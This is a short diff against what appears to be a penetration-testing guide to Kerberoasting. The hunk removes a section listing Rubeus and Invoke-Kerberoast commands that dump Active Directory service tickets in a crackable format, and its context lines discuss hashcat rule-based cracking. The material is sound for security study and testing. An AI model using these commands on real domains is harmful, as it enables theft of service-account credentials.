@@ -148,21 +148,6 @@ The `best64.rule` applies 64 common password patterns to each wordlist entry, su
 This significantly increases the keyspace but also the time required. Even with rules, passwords like "Summer2024!" may still resist cracking if the base word isn't in the wordlist or if the specific transformation pattern isn't covered by the ruleset.
 
 
-
-## Alternative Tools
-
-### Using Rubeus (Windows)
-
-If attacking from a Windows machine on the domain:
-```powershell
-.\Rubeus.exe kerberoast /outfile:tickets.kirbi
-```
-
-### Using Invoke-Kerberoast (PowerShell)
-```powershell
-Invoke-Kerberoast -OutputFormat Hashcat | Out-File -FilePath tickets.txt
-```
-
 ## Notes
 
 - Any authenticated domain user can request service tickets
